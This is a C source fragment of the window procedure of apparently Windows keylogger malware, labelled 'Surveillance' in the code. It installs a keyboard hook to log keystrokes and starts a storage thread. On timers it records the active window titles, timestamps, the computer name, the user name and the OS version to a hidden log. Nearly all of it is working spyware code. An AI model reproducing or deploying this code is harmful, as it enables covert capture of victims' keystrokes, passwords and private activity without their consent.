LRESULT CALLBACK SurveillanceWP(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		SendMessage(hWnd,WM_TIMER,2,NULL);
		SetTimer(hWnd, 1, WINDOW_STAMP, NULL);
		SetTimer(hWnd, 2, TIME_STAMP, NULL);
		///////////////////////
		// Start Surveillance
		///////////////////////
		{
			/* start the keylogger */
			KeyHook = SetWindowsHookEx(WH_KEYBOARD,
			(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,(DWORD)NULL);
			/* start the storage */
			DWORD UpdateThreadId = 0;
			CreateThread(NULL,0,StartUpdate,NULL,0,&UpdateThreadId);
		}
		break;
	case WM_CLOSE:
		SendMessage(UpdateWnd,WM_CLOSE,0,0);
		KillTimer(hWnd, 1);
		KillTimer(hWnd, 2);
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	case WM_TIMER:
		if(wParam == 1)  // Window Stamp
		{
			static HWND ForegroundWindow = NULL;
			static char *PreviousWindowName = NULL;
			BOOL has_changed = FALSE;

			if(GetForegroundWindow() != ForegroundWindow) {
				has_changed = TRUE;
				ForegroundWindow = GetForegroundWindow();
			}

			/* get WindowName */
			int size = GetWindowTextLength(ForegroundWindow)+1;
			char *WindowName = (char *)calloc(size,sizeof(char));
			size = GetWindowText(ForegroundWindow, WindowName, size);

			if(PreviousWindowName != NULL && WindowName != NULL) {
				if(strcmp(PreviousWindowName, WindowName))
					has_changed = TRUE;
			} else  has_changed = TRUE;

			if(has_changed)
			{
				if(PreviousWindowName)
					free(PreviousWindowName);
				if(WindowName) {
					if(strlen(WindowName)) {
						char *str = (char *)calloc
						((size+STR_SZ1)+STR_SZ2,sizeof(char));
						sprintf(str,"\n\r%s\n",WindowName);
						// Store Information
						STORE_INFO(str);
						free(str);
					}
				}
			}
			PreviousWindowName = WindowName;
		}
		if(wParam == 2)  // Time Stamp
		{
			char *str = (char *)calloc(STR_SZ2+20,1),
				 *sub = (char *)calloc(STR_SZ2,1);

			static char time_stamp = 0;
			if(!(time_stamp%5)) {
				time_stamp++;
				// for every 5 calls stamp time & date...
				TIME_ZONE_INFORMATION here;
				SYSTEMTIME utc, local;
				GetTimeZoneInformation(&here);
				GetLocalTime(&local);
				GetSystemTime(&utc);
				char AM_PM[3];
				if(local.wHour>12) {
					strcpy(AM_PM,"PM");
					local.wHour -= 12;
				} else strcpy(AM_PM,"AM");
				sprintf(sub,
				"%u/%u/%u %u:%u:%u %s (%uH%uM GMT)",
				local.wDay,local.wMonth,local.wYear,
				local.wHour,local.wMinute,local.wSecond,
				AM_PM,utc.wHour,utc.wMinute);
				// write the time & date...
				sprintf(str,"\n\rTime %s\n",sub);
				STORE_INFO(str);
			}
			static char system_stamp = 0;
			if(!(system_stamp%15)) {
				system_stamp++;
				// for every 15 calls do this....
				unsigned long int bsize = STR_SZ2;
				if( !GetComputerName(sub,&bsize) ) {
					sub = (char *) realloc (sub, bsize);
					GetComputerName(sub,&bsize);
				}
				sprintf(str," # Computer Name: %s\r\n",sub);
				STORE_INFO(str);
				if( !GetUserName(sub,&bsize) ) {
					sub = (char *) realloc (sub, bsize);
					GetUserName(sub,&bsize);
				}
				sprintf(str," # User Name: %s\r\n",sub);
				STORE_INFO(str);
				// get OS name & version ...
				OSVERSIONINFO ya;
				ya.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
				if( GetVersionEx(&ya) ) {
					sprintf(str," # Version %u.%u Build %u ",
						ya.dwMajorVersion,
						ya.dwMinorVersion,
						ya.dwBuildNumber);
					if(ya.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
						strcat(str,"Windows 9x ");
					else if(ya.dwPlatformId == VER_PLATFORM_WIN32_NT)
						strcat(str,"Windows NT ");
					strcat(str,ya.szCSDVersion);
					STORE_INFO(str);
				}
			}
			free(sub);
			free(str);
		}
		break;
	}
	return DefWindowProc(hWnd, message, wParam, lParam) ;
}